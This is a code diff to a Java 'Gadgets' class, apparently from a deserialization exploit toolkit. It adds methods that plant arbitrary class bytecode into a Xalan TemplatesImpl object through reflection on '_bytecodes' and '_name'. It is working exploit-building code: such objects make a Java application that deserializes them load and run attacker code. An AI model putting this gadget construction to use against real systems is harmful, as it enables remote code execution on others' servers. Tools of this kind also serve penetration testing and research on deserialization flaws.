@@ -102,6 +102,18 @@ public class Gadgets {
         return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
     }
 
+    public static Object createTemplatesImpl ( final byte[] classBytes, String className) throws Exception {
+        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
+            return createTemplatesImpl(
+                classBytes,
+                className,
+                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
+                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
+                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
+        }
+        return createTemplatesImpl(classBytes, className, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
+    }
+
 
     public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
             throws Exception {
@@ -132,6 +144,19 @@ public class Gadgets {
 
         // required to make TemplatesImpl happy
         Reflections.setFieldValue(templates, "_name", "Pwnr");
+        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
+        return templates;
+    }
+
+    public static <T> T createTemplatesImpl ( final byte[] classBytes, String className, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
+        throws Exception {
+        final T templates = tplClass.newInstance();
+        // inject class bytes into instance
+        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
+            classBytes, ClassFiles.classAsBytes(Foo.class)
+        });
+        // required to make TemplatesImpl happy
+        Reflections.setFieldValue(templates, "_name", className);
         Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
         return templates;
     }
